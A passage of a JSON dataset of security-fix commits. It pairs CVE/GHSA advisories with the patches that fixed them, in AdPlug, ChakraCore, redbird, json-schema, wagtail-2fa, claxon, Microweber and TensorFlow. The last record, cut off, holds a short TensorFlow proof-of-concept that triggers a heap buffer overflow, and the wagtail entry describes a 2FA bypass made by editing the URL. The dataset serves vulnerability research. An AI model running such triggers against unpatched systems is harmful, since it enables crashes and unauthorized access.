u6m.h.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/adplug\/adplug","commit_href":"https:\/\/github.com\/adplug\/adplug\/commit\/1a282a486a8e33fef3e15998bf6408d3515dc07e","commit_sha":"1a282a486a8e33fef3e15998bf6408d3515dc07e","patch":"MULTI","chain_ord":"['8abb9328bf27dcbdafc67ade3e75af0ffd8f7633', '1a282a486a8e33fef3e15998bf6408d3515dc07e']","before_first_fix_commit":"{'a8903d884e2c900e77af5c70ef440e72626646ad'}","last_fix_commit":"1a282a486a8e33fef3e15998bf6408d3515dc07e","chain_ord_pos":2.0,"commit_datetime":"05\/11\/2020, 11:48:45","message":"Update NEWS with a list of CVEs now fixed","author":"Adam Nielsen","comments":null,"stats":"{'additions': 10, 'deletions': 0, 'total': 10}","files":"{'NEWS': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/adplug\/adplug\/raw\/1a282a486a8e33fef3e15998bf6408d3515dc07e\/NEWS', 'patch': '@@ -2,6 +2,16 @@ This is a brief overview of user-visible changes in AdPlug.\\n \\n Changes for version 2.3.3:\\n --------------------------\\n+- Bug fixes: (huge thanks to Alexander Miller for these)\\n+  - CVE-2019-14690 - buffer overflow in .bmf\\n+  - CVE-2019-14691 - buffer overflow in .dtm\\n+  - CVE-2019-14692 - buffer overflow in .mkj\\n+  - CVE-2019-14732 - buffer overflow in .a2m\\n+  - CVE-2019-14733 - buffer overflow in .rad\\n+  - CVE-2019-14734 - buffer overflow in .mtk\\n+  - CVE-2019-15151 - double free and OOB reads in .u6m\\n+  - OOB reads in .xad\\n+  - OOB reads in .rix\\n \\n Changes for version 2.3.2:\\n --------------------------'}}","message_norm":"update news with a list of cves now fixed","language":"en","entities":"[('update', 'ACTION', ''), ('fixed', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['NEWS'])","num_files":1.0},{"index":1160,"vuln_id":"GHSA-874w-m2v2-mj64","cwe_id":"{'CWE-415'}","score":9.8,"chain":"{'https:\/\/github.com\/adplug\/adplug\/commit\/1a282a486a8e33fef3e15998bf6408d3515dc07e', 'https:\/\/github.com\/miller-alex\/adplug\/commit\/8abb9328bf27dcbdafc67ade3e75af0ffd8f7633'}","dataset":"osv","summary":"Double Free in Adplug AdPlug 2.3.1 has a double free in the Cu6mPlayer class in u6m.h.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/miller-alex\/adplug","commit_href":"https:\/\/github.com\/miller-alex\/adplug\/commit\/8abb9328bf27dcbdafc67ade3e75af0ffd8f7633","commit_sha":"8abb9328bf27dcbdafc67ade3e75af0ffd8f7633","patch":"MULTI","chain_ord":"['8abb9328bf27dcbdafc67ade3e75af0ffd8f7633', '1a282a486a8e33fef3e15998bf6408d3515dc07e']","before_first_fix_commit":"{'a8903d884e2c900e77af5c70ef440e72626646ad'}","last_fix_commit":"1a282a486a8e33fef3e15998bf6408d3515dc07e","chain_ord_pos":1.0,"commit_datetime":"03\/24\/2020, 14:43:22","message":"Fix double free in Cu6mPlayer::~Cu6mPlayer() (issue #91)\n\nLeave deallocation of song_data to destructor when\ndecompression fails, just like on success.\n\nThis fixes CVE-2019-15151.\n\nEven though load() is apparently not supposed to be called\ntwice (and bad things happen in many players if you do),\nlet's also avoid leaking song_data's memory in that case.\n\nFixes: https:\/\/github.com\/adplug\/adplug\/issues\/91","author":"Alexander Miller","comments":null,"stats":"{'additions': 1, 'deletions': 2, 'total': 3}","files":"{'src\/u6m.cpp': {'additions': 1, 'deletions': 2, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/miller-alex\/adplug\/raw\/8abb9328bf27dcbdafc67ade3e75af0ffd8f7633\/src%2Fu6m.cpp', 'patch': '@@ -66,6 +66,7 @@ bool Cu6mPlayer::load(const std::string &filename, const CFileProvider &fp)\\n     }\\n \\n   \/\/ load section\\n+  delete[] song_data;\\n   song_data = new unsigned char[decompressed_filesize];\\n   unsigned char* compressed_song_data = new unsigned char[filesize-3];\\n \\n@@ -74,7 +75,6 @@ bool Cu6mPlayer::load(const std::string &filename, const CFileProvider &fp)\\n   fp.close(f);\\n \\n   \/\/ attempt to decompress the song data\\n-  \/\/ if unsuccessful, deallocate song_data[] on the spot, and return(false)\\n   data_block source, destination;\\n   source.size = filesize-4;\\n   source.data = compressed_song_data;\\n@@ -84,7 +84,6 @@ bool Cu6mPlayer::load(const std::string &filename, const CFileProvider &fp)\\n   if (!lzw_decompress(source,destination))\\n     {\\n       delete[] compressed_song_data;\\n-      delete[] song_data;\\n       return(false);\\n     }'}}","message_norm":"fix double free in cu6mplayer::~cu6mplayer() (issue #91)\n\nleave deallocation of song_data to destructor when\ndecompression fails, just like on success.\n\nthis fixes cve-2019-15151.\n\neven though load() is apparently not supposed to be called\ntwice (and bad things happen in many players if you do),\nlet's also avoid leaking song_data's memory in that case.\n\nfixes: https:\/\/github.com\/adplug\/adplug\/issues\/91","language":"en","entities":"[('fix', 'ACTION', ''), ('double free', 'SECWORD', ''), ('#91', 'ISSUE', ''), ('decompression', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('cve-2019-15151', 'VULNID', 'CVE'), ('fixes', 'ACTION', ''), ('https:\/\/github.com\/adplug\/adplug\/issues\/91', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/u6m.cpp'])","num_files":1.0},{"index":1167,"vuln_id":"GHSA-88cw-3m6x-49f7","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/pull\/6528\/commits\/e81e8a51ec7ba3d0dfb6089254f166c2733216e1'}","dataset":"osv","summary":"Out-of-bounds Write in ChakraCore Chakra Scripting Engine Memory Corruption Vulnerability This CVE ID is unique from CVE-2020-17048.","published_date":"2021-08-02","chain_len":1,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/pull\/6528\/commits\/e81e8a51ec7ba3d0dfb6089254f166c2733216e1","commit_sha":"e81e8a51ec7ba3d0dfb6089254f166c2733216e1","patch":"SINGLE","chain_ord":"['e81e8a51ec7ba3d0dfb6089254f166c2733216e1']","before_first_fix_commit":"{'90e222e9a9ba64bd808666f44e6a0913d6318f78'}","last_fix_commit":"e81e8a51ec7ba3d0dfb6089254f166c2733216e1","chain_ord_pos":1.0,"commit_datetime":"09\/30\/2020, 22:00:01","message":"[CVE-2020-17054]","author":"Paul Leathers","comments":null,"stats":"{'additions': 5, 'deletions': 2, 'total': 7}","files":"{'lib\/Backend\/Lower.cpp': {'additions': 5, 'deletions': 2, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/e81e8a51ec7ba3d0dfb6089254f166c2733216e1\/lib%2FBackend%2FLower.cpp', 'patch': '@@ -27152,8 +27152,11 @@ void Lowerer::LowerLdFrameDisplay(IR::Instr *instr, bool doStackFrameDisplay)\\n         if (instr->m_func != this->m_func && this->m_func->DoStackFrameDisplay())\\n         {\\n             StackSym * inlineeFrameDisplaySym = instr->m_func->GetLocalFrameDisplaySym();\\n-            Assert(inlineeFrameDisplaySym->IsAllocated());\\n-            InsertMove(IR::SymOpnd::New(inlineeFrameDisplaySym, TyMachReg, m_func), dstOpnd, instr);\\n+            Assert((inlineeFrameDisplaySym && inlineeFrameDisplaySym->IsAllocated()) || this->m_func->IsLoopBody());\\n+            if (inlineeFrameDisplaySym && inlineeFrameDisplaySym->IsAllocated())\\n+            {\\n+                InsertMove(IR::SymOpnd::New(inlineeFrameDisplaySym, TyMachReg, m_func), dstOpnd, instr);\\n+            }\\n         }\\n     }'}}","message_norm":"[cve-2020-17054]","language":"ro","entities":"[('cve-2020-17054', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/Lower.cpp'])","num_files":1.0},{"index":1171,"vuln_id":"GHSA-8948-ffc6-jg52","cwe_id":"{'CWE-20'}","score":4.2,"chain":"{'https:\/\/github.com\/OptimalBits\/redbird\/commit\/39c7a2da84a2ddddfe046ea80e98800518920516'}","dataset":"osv","summary":"Insecure Default Configuration in redbird Versions of `redbird` prior to 0.9.1 have a vulnerable default configuration of allowing TLS 1.0 connections on `lib\/proxy.js`. The package does not provide an option to disable TLS 1.0 which is deprecated and vulnerable.\n\n\n## Recommendation\n\nUpgrade to version 0.9.1 or later.","published_date":"2019-06-06","chain_len":1,"project":"https:\/\/github.com\/OptimalBits\/redbird","commit_href":"https:\/\/github.com\/OptimalBits\/redbird\/commit\/39c7a2da84a2ddddfe046ea80e98800518920516","commit_sha":"39c7a2da84a2ddddfe046ea80e98800518920516","patch":"SINGLE","chain_ord":"['39c7a2da84a2ddddfe046ea80e98800518920516']","before_first_fix_commit":"{'b0ba23a53e881204e4bca4cef75305edb4f9e8b4'}","last_fix_commit":"39c7a2da84a2ddddfe046ea80e98800518920516","chain_ord_pos":1.0,"commit_datetime":"04\/17\/2019, 16:07:54","message":"Adding option to disable older SSL\/TLS versions\n\nSimply pass in \"secureOptions\" as you normally would to an https config object, and redbird will pass it along into the https proxy server.","author":"James Thomas","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'lib\/proxy.js': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/OptimalBits\/redbird\/raw\/39c7a2da84a2ddddfe046ea80e98800518920516\/lib%2Fproxy.js', 'patch': '@@ -252,6 +252,11 @@ ReverseProxy.prototype.setupHttpsProxy = function (proxy, websocketsUpgrade, log\\n     key: getCertData(sslOpts.key),\\n     cert: getCertData(sslOpts.cert)\\n   };\\n+  \\n+  \/\/ Allows the option to disable older SSL\/TLS versions\\n+  if(sslOpts.secureOptions) {\\n+    ssl.secureOptions = sslOpts.secureOptions;\\n+  }\\n \\n   if (sslOpts.ca) {\\n     ssl.ca = getCertData(sslOpts.ca, true);'}}","message_norm":"adding option to disable older ssl\/tls versions\n\nsimply pass in \"secureoptions\" as you normally would to an https config object, and redbird will pass it along into the https proxy server.","language":"en","entities":"[('adding', 'ACTION', ''), ('ssl', 'SECWORD', ''), ('tls', 'SECWORD', ''), ('secureoptions', 'SECWORD', ''), ('https proxy', 'SECWORD', ''), ('server', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/proxy.js'])","num_files":1.0},{"index":1173,"vuln_id":"GHSA-896r-f27r-55mw","cwe_id":"{'CWE-1321', 'CWE-915'}","score":9.8,"chain":"{'https:\/\/github.com\/kriszyp\/json-schema\/commit\/b62f1da1ff5442f23443d6be6a92d00e65cba93a', 'https:\/\/github.com\/kriszyp\/json-schema\/commit\/22f146111f541d9737e832823699ad3528ca7741', 'https:\/\/github.com\/kriszyp\/json-schema\/commit\/f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa'}","dataset":"osv","summary":"json-schema is vulnerable to Prototype Pollution json-schema before version 0.4.0 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').","published_date":"2021-11-19","chain_len":3,"project":"https:\/\/github.com\/kriszyp\/json-schema","commit_href":"https:\/\/github.com\/kriszyp\/json-schema\/commit\/b62f1da1ff5442f23443d6be6a92d00e65cba93a","commit_sha":"b62f1da1ff5442f23443d6be6a92d00e65cba93a","patch":"MULTI","chain_ord":"['22f146111f541d9737e832823699ad3528ca7741', 'b62f1da1ff5442f23443d6be6a92d00e65cba93a', 'f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa']","before_first_fix_commit":"{'ef60987a9a14b9d9c739384460044ba53cd9b9a2'}","last_fix_commit":"f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa","chain_ord_pos":2.0,"commit_datetime":"11\/02\/2021, 02:41:46","message":"Protect against constructor modification, #84","author":"Kris Zyp","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/validate.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kriszyp\/json-schema\/raw\/b62f1da1ff5442f23443d6be6a92d00e65cba93a\/lib%2Fvalidate.js', 'patch': \"@@ -207,7 +207,7 @@ var validate = exports._validate = function(\/*Any*\/instance,\/*Object*\/schema,\/*O\\n \\t\\t\\t}\\n \\t\\t\\t\\n \\t\\t\\tfor(var i in objTypeDef){ \\n-\\t\\t\\t\\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__'){\\n+\\t\\t\\t\\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__' && i != 'constructor'){\\n \\t\\t\\t\\t\\tvar value = instance[i];\\n \\t\\t\\t\\t\\t\/\/ skip _not_ specified properties\\n \\t\\t\\t\\t\\tif (value === undefined && options.existingOnly) continue;\"}}","message_norm":"protect against constructor modification, #84","language":"en","entities":"[('protect', 'SECWORD', ''), ('#84', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/validate.js'])","num_files":1.0},{"index":1175,"vuln_id":"GHSA-896r-f27r-55mw","cwe_id":"{'CWE-1321', 'CWE-915'}","score":9.8,"chain":"{'https:\/\/github.com\/kriszyp\/json-schema\/commit\/b62f1da1ff5442f23443d6be6a92d00e65cba93a', 'https:\/\/github.com\/kriszyp\/json-schema\/commit\/22f146111f541d9737e832823699ad3528ca7741', 'https:\/\/github.com\/kriszyp\/json-schema\/commit\/f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa'}","dataset":"osv","summary":"json-schema is vulnerable to Prototype Pollution json-schema before version 0.4.0 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').","published_date":"2021-11-19","chain_len":3,"project":"https:\/\/github.com\/kriszyp\/json-schema","commit_href":"https:\/\/github.com\/kriszyp\/json-schema\/commit\/f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa","commit_sha":"f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa","patch":"MULTI","chain_ord":"['22f146111f541d9737e832823699ad3528ca7741', 'b62f1da1ff5442f23443d6be6a92d00e65cba93a', 'f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa']","before_first_fix_commit":"{'ef60987a9a14b9d9c739384460044ba53cd9b9a2'}","last_fix_commit":"f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa","chain_ord_pos":3.0,"commit_datetime":"11\/02\/2021, 02:47:49","message":"Use a little more robust method of checking instances","author":"Kris Zyp","comments":"{'com_1': {'author': 'JamieSlome', 'datetime': '11\/02\/2021, 10:48:47', 'body': '@kriszyp - just to confirm, does this fix the report submitted by the researcher [here](https:\/\/huntr.dev\/bounties\/bb6ccd63-f505-4e3a-b55f-cd2662c261a9\/)?'}, 'com_2': {'author': 'kriszyp', 'datetime': '11\/02\/2021, 11:20:36', 'body': '> does this fix the report submitted by the researcher here?\\r\\n\\r\\nYes, along with https:\/\/github.com\/kriszyp\/json-schema\/commit\/22f146111f541d9737e832823699ad3528ca7741, that is intended to fix that security issue.'}, 'com_3': {'author': 'JamieSlome', 'datetime': '11\/02\/2021, 12:10:20', 'body': '@kriszyp - thanks for the heads up! Are you able to confirm this on the report, and we can go ahead and publish a CVE \/ make the report public?\\r\\n\\r\\n(cc @yoshino-s)'}, 'com_4': {'author': 'kriszyp', 'datetime': '11\/09\/2021, 02:04:23', 'body': 'Yes, I have published the updated version with the fix.'}, 'com_5': {'author': 'JamieSlome', 'datetime': '11\/09\/2021, 07:55:24', 'body': '@kriszyp - could you update this on the report: https:\/\/huntr.dev\/bounties\/bb6ccd63-f505-4e3a-b55f-cd2662c261a9\/\\r\\n\\r\\nYou can also decide if you would like to keep the bounty for yourself or return it to the prize pot \ud83d\udc4c'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/validate.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kriszyp\/json-schema\/raw\/f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa\/lib%2Fvalidate.js', 'patch': \"@@ -208,7 +208,7 @@ var validate = exports._validate = function(\/*Any*\/instance,\/*Object*\/schema,\/*O\\n \\t\\t\\t\\n \\t\\t\\tfor(var i in objTypeDef){ \\n \\t\\t\\t\\tif(objTypeDef.hasOwnProperty(i) && i != '__proto__' && i != 'constructor'){\\n-\\t\\t\\t\\t\\tvar value = instance[i];\\n+\\t\\t\\t\\t\\tvar value = instance.hasOwnProperty(i) ? instance[i] : undefined;\\n \\t\\t\\t\\t\\t\/\/ skip _not_ specified properties\\n \\t\\t\\t\\t\\tif (value === undefined && options.existingOnly) continue;\\n \\t\\t\\t\\t\\tvar propDef = objTypeDef[i];\"}}","message_norm":"use a little more robust method of checking instances","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/validate.js'])","num_files":1.0},{"index":1179,"vuln_id":"GHSA-89px-ww3j-g2mm","cwe_id":"{'CWE-304', 'CWE-290'}","score":8.7,"chain":"{'https:\/\/github.com\/labd\/wagtail-2fa\/commit\/13b12995d35b566df08a17257a23863ab6efb0ca', 'https:\/\/github.com\/labd\/wagtail-2fa\/commit\/a6711b29711729005770ff481b22675b35ff5c81'}","dataset":"osv","summary":"2FA bypass in Wagtail through new device path ## 2FA bypass through new device path\n\n### Impact\nIf someone gains access to someone's Wagtail login credentials, they can log into the CMS and bypass the 2FA check by changing the URL. They can then add a new device and gain full access to the CMS.\n\n### Patches\nThis problem has been patched in version 1.3.0.\n\n### Workarounds\nThere is no workaround at the moment.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com\/labd\/wagtail-2fa](https:\/\/github.com\/labd\/wagtail-2fa)\n* Email us at [security@labdigital.nl](mailto:security@labdigital.nl)","published_date":"2019-11-29","chain_len":2,"project":"https:\/\/github.com\/labd\/wagtail-2fa","commit_href":"https:\/\/github.com\/labd\/wagtail-2fa\/commit\/13b12995d35b566df08a17257a23863ab6efb0ca","commit_sha":"13b12995d35b566df08a17257a23863ab6efb0ca","patch":"MULTI","chain_ord":"['a6711b29711729005770ff481b22675b35ff5c81', '13b12995d35b566df08a17257a23863ab6efb0ca']","before_first_fix_commit":"{'bceef354b3ab885350e3bc79a793589c491f6037'}","last_fix_commit":"13b12995d35b566df08a17257a23863ab6efb0ca","chain_ord_pos":2.0,"commit_datetime":"11\/26\/2019, 11:56:05","message":"Update changelog for 1.3.0 release","author":"Mike Dingjan","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'CHANGES': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/labd\/wagtail-2fa\/raw\/13b12995d35b566df08a17257a23863ab6efb0ca\/CHANGES', 'patch': '@@ -1,3 +1,11 @@\\n+1.3.0 (2019.11.26)\\n+==================\\n+ - Add OtpRequiredMixin to enforce OTP checks in views\\n+ - Resolve possible vulnerabilities:\\n+    - [CWE-290](http:\/\/cwe.mitre.org\/data\/definitions\/290.html)\\n+    - [CWE-20](http:\/\/cwe.mitre.org\/data\/definitions\/20.html)\\n+\\n+\\n 1.2.0 (2019-10-30)\\n ==================\\n  - Added missing deps for generation of the docs'}}","message_norm":"update changelog for 1.3.0 release","language":"en","entities":"[('update', 'ACTION', ''), ('1.3.0', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['CHANGES'])","num_files":1.0},{"index":1182,"vuln_id":"GHSA-8c6g-4xc5-w96c","cwe_id":"{'CWE-908'}","score":6.5,"chain":"{'https:\/\/github.com\/ruuda\/claxon\/commit\/8f28ec275e412dd3af4f3cda460605512faf332c'}","dataset":"osv","summary":"Uninitialized memory exposure in claxon An issue was discovered in the claxon crate before 0.4.1 for Rust. Uninitialized memory can be exposed because certain decode buffer sizes are mishandled.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/ruuda\/claxon","commit_href":"https:\/\/github.com\/ruuda\/claxon\/commit\/8f28ec275e412dd3af4f3cda460605512faf332c","commit_sha":"8f28ec275e412dd3af4f3cda460605512faf332c","patch":"SINGLE","chain_ord":"['8f28ec275e412dd3af4f3cda460605512faf332c']","before_first_fix_commit":"{'cd82be35f413940ba446d2a19f10d74b86466487'}","last_fix_commit":"8f28ec275e412dd3af4f3cda460605512faf332c","chain_ord_pos":1.0,"commit_datetime":"08\/23\/2018, 18:01:40","message":"Fix bug in decoding residuals\n\nA partition order could occur, such that the block size was not a\nmultiple of 2^order. Computation of the number of samples per partition\ndid not account for this case, rounding down due to the bit shift. This\nmeant that we would not fill the entire decode buffer.\n\nClaxon does not zero the decode buffer because it is (should be)\noverwritten anyway, and in the case of a format error, where the buffer\nmight be only partially full, the buffer is not exposed again.\nFurthermore, the way decoding works in most places, is that we fill the\nentire buffer, just by looping to fill it. If the input bitstream does\nnot contain enough data to fill the buffer, then that's a format error.\nIn a few places though, we need to slice up the buffer before decoding\ninto it: for decoding individual channels, and also for decoding\nresiduals, which are split into partitions.\n\nThis particular format error was especially nasty because it did not\ncause a format error down the line. Instead, it caused the buffer to be\nsliced in a way where the slices together did not cover the entire\nbuffer, and so parts of uninitialized memory could remain in the buffer.\n\nThanks a lot to Sergey \"Shnatsel\" Davidoff for reporting this bug,\ntogether with elaborate steps to reproduce that allowed me to pinpoint\nthe cause quickly.","author":"Ruud van Asseldonk","comments":null,"stats":"{'additions': 19, 'deletions': 6, 'total': 25}","files":"{'src\/subframe.rs': {'additions': 19, 'deletions': 6, 'changes': 25, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ruuda\/claxon\/raw\/8f28ec275e412dd3af4f3cda460605512faf332c\/src%2Fsubframe.rs', 'patch': '@@ -254,35 +254,48 @@ fn decode_residual<R: ReadBytes>(input: &mut Bitstream<R>,\\n     \/\/ most 2^16 - 1 samples in the block. No values have been marked as\\n     \/\/ invalid by the specification though.\\n     let n_partitions = 1u32 << order;\\n-    let n_samples = block_size >> order;\\n+    let n_samples_per_partition = block_size >> order;\\n+\\n+    \/\/ The partitions together must fill the block. If the block size is not a\\n+    \/\/ multiple of 2^order; if we shifted off some bits, then we would not fill\\n+    \/\/ the entire block. Such a partition order is invalid for this block size.\\n+    if block_size & (n_partitions - 1) as u16 != 0 {\\n+        return fmt_err(\"invalid partition order\")\\n+    }\\n+\\n+    \/\/ NOTE: the check above checks that block_size is a multiple of n_partitions\\n+    \/\/ (this works because n_partitions is a power of 2). The check below is\\n+    \/\/ equivalent but more expensive.\\n+    debug_assert_eq!(n_partitions * n_samples_per_partition as u32, block_size as u32);\\n+\\n     let n_warm_up = block_size - buffer.len() as u16;\\n \\n     \/\/ The partition size must be at least as big as the number of warm-up\\n     \/\/ samples, otherwise the size of the first partition is negative.\\n-    if n_warm_up > n_samples {\\n+    if n_warm_up > n_samples_per_partition {\\n         return fmt_err(\"invalid residual\");\\n     }\\n \\n     \/\/ Finally decode the partitions themselves.\\n     match partition_type {\\n         RicePartitionType::Rice => {\\n             let mut start = 0;\\n-            let mut len = n_samples - n_warm_up;\\n+            let mut len = n_samples_per_partition - n_warm_up;\\n             for _ in 0..n_partitions {\\n                 let slice = &mut buffer[start..start + len as usize];\\n                 try!(decode_rice_partition(input, slice));\\n                 start = start + len as usize;\\n-                len = n_samples;\\n+                len = n_samples_per_partition;\\n             }\\n         }\\n         RicePartitionType::Rice2 => {\\n             let mut start = 0;\\n-            let mut len = n_samples - n_warm_up;\\n+            let mut len = n_samples_per_partition - n_warm_up;\\n             for _ in 0..n_partitions {\\n                 let slice = &mut buffer[start..start + len as usize];\\n                 try!(decode_rice2_partition(input, slice));\\n                 start = start + len as usize;\\n-                len = n_samples;\\n+                len = n_samples_per_partition;\\n             }\\n         }\\n     }'}}","message_norm":"fix bug in decoding residuals\n\na partition order could occur, such that the block size was not a\nmultiple of 2^order. computation of the number of samples per partition\ndid not account for this case, rounding down due to the bit shift. this\nmeant that we would not fill the entire decode buffer.\n\nclaxon does not zero the decode buffer because it is (should be)\noverwritten anyway, and in the case of a format error, where the buffer\nmight be only partially full, the buffer is not exposed again.\nfurthermore, the way decoding works in most places, is that we fill the\nentire buffer, just by looping to fill it. if the input bitstream does\nnot contain enough data to fill the buffer, then that's a format error.\nin a few places though, we need to slice up the buffer before decoding\ninto it: for decoding individual channels, and also for decoding\nresiduals, which are split into partitions.\n\nthis particular format error was especially nasty because it did not\ncause a format error down the line. instead, it caused the buffer to be\nsliced in a way where the slices together did not cover the entire\nbuffer, and so parts of uninitialized memory could remain in the buffer.\n\nthanks a lot to sergey \"shnatsel\" davidoff for reporting this bug,\ntogether with elaborate steps to reproduce that allowed me to pinpoint\nthe cause quickly.","language":"en","entities":"[('fix', 'ACTION', ''), ('bug', 'FLAW', ''), ('decoding', 'SECWORD', ''), ('decode', 'SECWORD', ''), ('decode', 'SECWORD', ''), ('error', 'FLAW', ''), ('decoding', 'SECWORD', ''), ('error', 'FLAW', ''), ('decoding', 'SECWORD', ''), ('decoding', 'SECWORD', ''), ('decoding', 'SECWORD', ''), ('error', 'FLAW', ''), ('error', 'FLAW', ''), ('uninitialized memory', 'SECWORD', ''), ('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/subframe.rs'])","num_files":1.0},{"index":1183,"vuln_id":"GHSA-8c76-mxv5-w4g8","cwe_id":"{'CWE-79'}","score":6.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/955471c27e671c49e4b012e3b120b004082ac3f7'}","dataset":"osv","summary":"Stored Cross-site Scripting in Microweber Microweber 1.2.11 and prior contains multiple stored cross-site scripting vulnerabilities in Shop's Other Settings, Shop's Autorespond E-mail Settings and Shops' Payments Methods.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/955471c27e671c49e4b012e3b120b004082ac3f7","commit_sha":"955471c27e671c49e4b012e3b120b004082ac3f7","patch":"SINGLE","chain_ord":"['955471c27e671c49e4b012e3b120b004082ac3f7']","before_first_fix_commit":"{'46e100a1b3e613f3e27b82942b00bdb0e69df4fa'}","last_fix_commit":"955471c27e671c49e4b012e3b120b004082ac3f7","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 10:14:14","message":"Update SaveOptionApiController.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 19, 'deletions': 7, 'total': 26}","files":"{'src\/MicroweberPackages\/Option\/Http\/Controllers\/Api\/SaveOptionApiController.php': {'additions': 19, 'deletions': 7, 'changes': 26, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/955471c27e671c49e4b012e3b120b004082ac3f7\/src%2FMicroweberPackages%2FOption%2FHttp%2FControllers%2FApi%2FSaveOptionApiController.php', 'patch': \"@@ -6,18 +6,30 @@\\n \\n class SaveOptionApiController\\n {\\n-    public function saveOption(Request $request) {\\n+    public $whitelistedGroupKeys = [\\n+        'website' => [\\n+            'website_head',\\n+            'website_footer'\\n+        ]\\n+    ];\\n+\\n+    public function saveOption(Request $request)\\n+    {\\n \\n         $cleanFromXss = true;\\n         $option = $request->all();\\n \\n-        \/\/ Allow for this keys\\n+        \/\/ Allow for this keys and groups\\n         if (isset($option['option_key'])) {\\n-            if ($option['option_key'] == 'website_head') {\\n-                $cleanFromXss = false;\\n-            }\\n-            if ($option['option_key'] == 'website_footer') {\\n-                $cleanFromXss = false;\\n+            foreach ($this->whitelistedGroupKeys as $group => $keys) {\\n+                if ($option['option_group'] == $group) {\\n+                    foreach ($keys as $key) {\\n+                        if ($option['option_key'] == $key) {\\n+                            $cleanFromXss = false;\\n+                            break;\\n+                        }\\n+                    }\\n+                }\\n             }\\n         }\"}}","message_norm":"update saveoptionapicontroller.php","language":"it","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"SUBMIT_CENTERED","list_files":"dict_keys(['src\/MicroweberPackages\/Option\/Http\/Controllers\/Api\/SaveOptionApiController.php'])","num_files":1.0},{"index":1184,"vuln_id":"GHSA-8c89-2vwr-chcq","cwe_id":"{'CWE-787', 'CWE-131'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f6c40f0c6cbf00d46c7717a26419f2062f2f8694'}","dataset":"osv","summary":"Heap buffer overflow in `QuantizedResizeBilinear` ### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedResizeBilinear` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\nimages = tf.constant([], shape=[0], dtype=tf.qint32)\nsize = tf.constant([], shape=[0], dtype=tf.int32) \nmin = tf.constant([], dtype=tf.float32)\nmax = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max, align_corners=False, half_pixel_centers=False)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/50711818d2e61ccce012591eeb4fdf93a8496726\/tensorflow\/core\/kernels\/quantized_resize_bilinear_op.cc#L705-L706) assumes that the 2 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc\nconst float in_min = context->input(2).flat<float>()(0);\nconst float in_max = context->input(3).flat<float>()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat<T>()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches \nWe have patched the issue in GitHub commit [f6c40f0c6cbf00d46c7717a26419f2062f2f8694](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f6c40f0c6cbf00d46c7717a26419f2062f2f8694).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 